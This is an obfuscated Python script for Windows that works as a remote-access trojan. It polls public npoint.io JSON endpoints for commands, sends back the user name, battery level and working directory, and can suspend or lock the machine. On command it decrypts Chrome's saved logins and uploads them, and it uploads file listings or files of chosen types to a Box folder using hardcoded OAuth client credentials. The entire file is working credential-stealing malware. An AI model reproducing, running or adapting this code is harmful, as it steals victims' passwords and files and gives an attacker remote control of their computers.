import ctypes ,psutil ,os #line:1
import time ,requests ,json ,datetime #line:2
import base64 ,sqlite3 ,win32crypt ,random ,shutil #line:3
from Crypto .Cipher import AES #line:4
from boxsdk import OAuth2 ,Client #line:5
from datetime import timezone ,timedelta #line:6
USER_NAME =os .getlogin ()#line:8
def li (OOOOO0OO0O0OOOO00 ,O0O00O0OO00OOOO00 ):#line:10
    O00O000O00000000O ="."+O0O00O0OO00OOOO00 #line:11
    O0O0O00O0OOOO00OO =[]#line:12
    for O0000O0O000O0O0O0 ,OOOOOOO0000OOOO0O ,O00O000O00O00000O in os .walk (OOOOO0OO0O0OOOO00 ):#line:14
        for OO0O00OOOO00OOO0O in O00O000O00O00000O :#line:15
            if O00O000O00000000O in OO0O00OOOO00OOO0O :#line:16
                OOOOOOOO000000O00 =os .path .join (O0000O0O000O0O0O0 ,OO0O00OOOO00OOO0O )#line:17
                O0O0O00O0OOOO00OO .append (OOOOOOOO000000O00 )#line:18
    return O0O0O00O0OOOO00OO #line:19
def lia (OOOO000O00O00OO0O ,OOOOOO000O0O0O0OO ):#line:21
    OO0OOOO00OO0OO000 =[]#line:22
    O000OOOO00OOOO000 =os .path .join (os .path .join (os .environ ['USERPROFILE']),'Documents','Tree-'+USER_NAME +str (datetime .datetime .now ()).replace (":","-")+'.txt')#line:23
    for O000O0O0O0000O0OO ,OOO0000O0O00OO00O ,O000OOO0000OO00O0 in os .walk (OOOO000O00O00OO0O ):#line:25
        for OO000OOO00000OO0O in O000OOO0000OO00O0 :#line:26
            O0000O00000OO0OO0 =os .path .join (O000O0O0O0000O0OO ,OO000OOO00000OO0O )#line:27
            OO0OOOO00OO0OO000 .append (O0000O00000OO0OO0 )#line:28
    for O0OOOOOO0000000OO in OO0OOOO00OO0OO000 :#line:29
        with open (O000OOOO00OOOO000 ,"a",encoding ="utf-8")as O00OOO000OO0OOOOO :#line:30
            O00OOO000OO0OOOOO .write (O0OOOOOO0000000OO .replace ("\\","/")+"\n")#line:31
        O00OOO000OO0OOOOO .close ()#line:32
    try :#line:33
        upload (O000OOOO00OOOO000 ,OOOOOO000O0O0O0OO )#line:34
    except :#line:35
        print ("Command ERROR")#line:36
    os .remove (O000OOOO00OOOO000 )#line:37
    return True #line:38
def upload (OO0000OOOO000OO00 ,O0OOOO0OOO0O0O0O0 ):#line:40
        OOOO000OOOO0O000O ='152448042033'#line:41
        try :#line:42
            O0000000O0O00OOO0 =OAuth2 (client_id ='q7xyfden1kqr1njwmthmrlhm2maj9imj',client_secret ='T7afVolugPHyGv0VEfr6oSpIluZai9GJ',access_token =O0OOOO0OOO0O0O0O0 ,)#line:47
            OOOOOO0000O0O0OOO =Client (O0000000O0O00OOO0 )#line:48
            OOOO000000OO0OO0O =OOOOOO0000O0O0OOO .user ().get ()#line:49
        except :#line:50
            print ("ERROR")#line:51
        O0O00000OOOOOO000 =OOOOOO0000O0O0OOO .folder (OOOO000OOOO0O000O ).upload (OO0000OOOO000OO00 )#line:53
def exim (OO0O0000O0OO0OO0O ,O0O00OOOO0O0000O0 ,O0O0OO0O00O0OO000 ):#line:55
    O000OO000O0O0OOO0 =li (OO0O0000O0OO0OO0O ,O0O00OOOO0O0000O0 )#line:56
    for O0000O0OO00OOO0OO in O000OO000O0O0OOO0 :#line:57
        upload (O0000O0OO00OOO0OO ,O0O0OO0O00O0OO000 )#line:58
def trex (O0O0O0O000000O00O ):#line:61
    def OOO0OO0O000OO0O0O (OO0O0000O000O0O0O ):#line:63
        return datetime .datetime (1601 ,1 ,1 )+timedelta (microseconds =OO0O0000O000O0O0O )#line:64
    def O000OO000000OOO0O ():#line:66
        O0OOO00O0OOOO000O =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")#line:69
        with open (O0OOO00O0OOOO000O ,"r",encoding ="utf-8")as OOOOO0OOO000OO0O0 :#line:70
            O0OO0OOO0OO000O0O =OOOOO0OOO000OO0O0 .read ()#line:71
            O0OO0OOO0OO000O0O =json .loads (O0OO0OOO0OO000O0O )#line:72
        OO0O0OOOOO0O00000 =base64 .b64decode (O0OO0OOO0OO000O0O ["os_crypt"]["encrypted_key"])#line:74
        OO0O0OOOOO0O00000 =OO0O0OOOOO0O00000 [5 :]#line:75
        return win32crypt .CryptUnprotectData (OO0O0OOOOO0O00000 ,None ,None ,None ,0 )[1 ]#line:76
    def O0000OOO000O000O0 (O00OOOO00OOO0O0O0 ,OO00O00OOOO0OOOOO ):#line:78
        try :#line:79
            O00OOO0O0000O0000 =O00OOOO00OOO0O0O0 [3 :15 ]#line:80
            O00OOOO00OOO0O0O0 =O00OOOO00OOO0O0O0 [15 :]#line:81
            OO00OOOO0O0OOOOOO =AES .new (OO00O00OOOO0OOOOO ,AES .MODE_GCM ,O00OOO0O0000O0000 )#line:83
            return OO00OOOO0O0OOOOOO .decrypt (O00OOOO00OOO0O0O0 )[:-16 ].decode ()#line:85
        except :#line:86
            try :#line:87
                return str (win32crypt .CryptUnprotectData (O00OOOO00OOO0O0O0 ,None ,None ,None ,0 )[1 ])#line:88
            except :#line:89
                return ""#line:91
    def OOO0O000O0000OOO0 ():#line:93
        OO000O0OOOOOO0OO0 =O000OO000000OOO0O ()#line:95
        O00OO0OO0O0OO0O00 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")#line:98
        OO0000O000OOO0O0O ="log.db"#line:101
        shutil .copyfile (O00OO0OO0O0OO0O00 ,OO0000O000OOO0O0O )#line:102
        OOO0O00OOO0OO0OO0 =sqlite3 .connect (OO0000O000OOO0O0O )#line:104
        OOOO00O0OOOOO0O00 =OOO0O00OOO0OO0OO0 .cursor ()#line:105
        OOOO00O0OOOOO0O00 .execute ("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")#line:107
        OOOO00O0OOO0O0OOO ="Temp"+str (random .randint (10000000 ,999999999 ))+".db"#line:109
        O0OO0OOO0O00OO0O0 =open (OOOO00O0OOO0O0OOO ,"a")#line:110
        O0OO0OOO0O00OO0O0 .write ("Origin URL, Action URL, Username, Password, Date Created, Date Last Used")#line:111
        for OOOOOOOOOOOO00OO0 in OOOO00O0OOOOO0O00 .fetchall ():#line:114
            O0O00000O0OOOO000 =OOOOOOOOOOOO00OO0 [0 ]#line:115
            O0O0OOO0OOO000000 =OOOOOOOOOOOO00OO0 [1 ]#line:116
            O000O0O0000000000 =OOOOOOOOOOOO00OO0 [2 ]#line:117
            OO0O00OOO0O0000OO =O0000OOO000O000O0 (OOOOOOOOOOOO00OO0 [3 ],OO000O0OOOOOO0OO0 )#line:118
            OO0000O000O0OO000 =OOOOOOOOOOOO00OO0 [4 ]#line:119
            if OO0000O000O0OO000 !=86400000000 and OO0000O000O0OO000 :#line:120
                OO0000O000O0OO000 =str (OOO0OO0O000OO0O0O (OO0000O000O0OO000 ))#line:121
            O00OO0OOO0OO0O000 =OOOOOOOOOOOO00OO0 [5 ]#line:122
            if O00OO0OOO0OO0O000 !=86400000000 and O00OO0OOO0OO0O000 :#line:123
                O00OO0OOO0OO0O000 =str (OOO0OO0O000OO0O0O (O00OO0OOO0OO0O000 ))#line:124
            if O000O0O0000000000 or OO0O00OOO0O0000OO :#line:126
                OOO0O00000O000OO0 ="\n"+str (O0O00000O0OOOO000 )+","+str (O0O0OOO0OOO000000 )+", "+str (O000O0O0000000000 )+", "+str (OO0O00OOO0O0000OO )+", "+str (OO0000O000O0OO000 )+", "+str (O00OO0OOO0OO0O000 );#line:127
                O0OO0OOO0O00OO0O0 .write (OOO0O00000O000OO0 )#line:129
            else :#line:130
                continue #line:131
        OOOO00O0OOOOO0O00 .close ()#line:132
        OOO0O00OOO0OO0OO0 .close ()#line:133
        O0OO0OOO0O00OO0O0 .close ()#line:134
        try :#line:135
            upload (OOOO00O0OOO0O0OOO ,O0O0O0O000000O00O )#line:136
        except :#line:137
            print ("An Error Occured. Error Code: x54000009876")#line:138
        try :#line:140
            os .remove (OO0000O000OOO0O0O )#line:141
            os .remove (OOOO00O0OOO0O0OOO )#line:142
        except :#line:145
            print ("An Error Occured. Error Code: x54000009542")#line:146
            pass #line:147
    OOO0O000O0000OOO0 ()#line:148
clist =["X"]#line:153
def reset ():#line:155
    O0000OO00000O0OO0 ="https://api.npoint.io/79f50dae7548f229dc4d"#line:156
    OOOOO0000O0O0OO00 ={"cmd":"0"}#line:157
    O00000O0O00OO0OO0 =requests .post (O0000OO00000O0OO0 ,json =OOOOO0000O0O0OO00 )#line:158
    O00O00O0O0O00O000 =requests .get (O0000OO00000O0OO0 )#line:159
    print (O00O00O0O0O00O000 .status_code )#line:160
def battery ():#line:162
    O0000O0OOO0OO0OO0 =psutil .sensors_battery ()#line:163
    return O0000O0OOO0OO0OO0 .percent #line:164
def status ():#line:166
    O0OO0O0000O00O000 ="https://api.npoint.io/97b72edf9de24c381c86"#line:167
    O000000O0000O0O0O =requests .get (O0OO0O0000O00O000 )#line:168
    OO00O0O0O00OO0O0O =str (int (datetime .datetime .utcnow ().timestamp ())+19800 )#line:170
    OO000000OO00O0OOO ={"date":OO00O0O0O00OO0O0O ,"battery":battery (),"user":USER_NAME ,"pwd":os .path .abspath (os .getcwd ())}#line:171
    OO000OO00O0O0O0O0 =requests .post (O0OO0O0000O00O000 ,json =OO000000OO00O0OOO )#line:172
def run (OO00OOO0OOO00O0O0 ):#line:175
    OO000O0OOOO00O0OO =OO00OOO0OOO00O0O0 .split ("$#")#line:176
    O00O0O000OO000OO0 =OO000O0OOOO00O0OO [1 ]#line:177
    if O00O0O000OO000OO0 =="lia":#line:178
        OO00000O0O000OO0O =OO000O0OOOO00O0OO [2 ]#line:179
        OO0O0OOOOOOO0OOOO =OO000O0OOOO00O0OO [3 ]#line:180
        lia (OO00000O0O000OO0O ,OO0O0OOOOOOO0OOOO )#line:181
    elif O00O0O000OO000OO0 =="exim":#line:184
        OO00000O0O000OO0O =OO000O0OOOO00O0OO [2 ]#line:185
        OO0O0OOOOOOO0OOOO =OO000O0OOOO00O0OO [3 ]#line:186
        O0OOOO0OOO0O00O00 =OO000O0OOOO00O0OO [4 ]#line:187
        exim (OO00000O0O000OO0O ,O0OOOO0OOO0O00O00 ,OO0O0OOOOOOO0OOOO )#line:188
    elif O00O0O000OO000OO0 =="upload":#line:191
        OO000OOOO00000O0O =OO000O0OOOO00O0OO [2 ]#line:192
        OO0O0OOOOOOO0OOOO =OO000O0OOOO00O0OO [3 ]#line:193
        upload (OO000OOOO00000O0O ,OO0O0OOOOOOO0OOOO )#line:194
    elif O00O0O000OO000OO0 =="trex":#line:197
        OO0O0OOOOOOO0OOOO =OO000O0OOOO00O0OO [3 ]#line:199
        trex (OO0O0OOOOOOO0OOOO )#line:201
    else :#line:204
        print (OO000O0OOOO00O0OO )#line:205
def Command (OOO0OO0OOOO0OOO0O ):#line:207
    if OOO0OO0OOOO0OOO0O =="1":#line:208
        os .system ("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")#line:209
    elif OOO0OO0OOOO0OOO0O =="2":#line:211
        print ("Test")#line:212
    elif OOO0OO0OOOO0OOO0O =="3":#line:214
        ctypes .windll .user32 .LockWorkStation ()#line:215
    else :#line:216
        if OOO0OO0OOOO0OOO0O [:1 ]=="R":#line:217
            try :#line:218
                run (OOO0OO0OOOO0OOO0O )#line:219
            except Exception as OO0000OOO000O00OO :#line:220
                print ("COMMAND ERROR",OO0000OOO000O00OO )#line:221
        else :#line:222
            print ("Command-",OOO0OO0OOOO0OOO0O )#line:223
while True :#line:225
    response =requests .get ('https://api.npoint.io/79f50dae7548f229dc4d').json ()#line:226
    cmd =response ['cmd']#line:227
    status ()#line:228
    if cmd not in clist :#line:229
        clist .append (cmd )#line:230
        clist .pop (0 )#line:231
        print (cmd )#line:232
        Command (cmd )#line:233
        reset ()#line:234
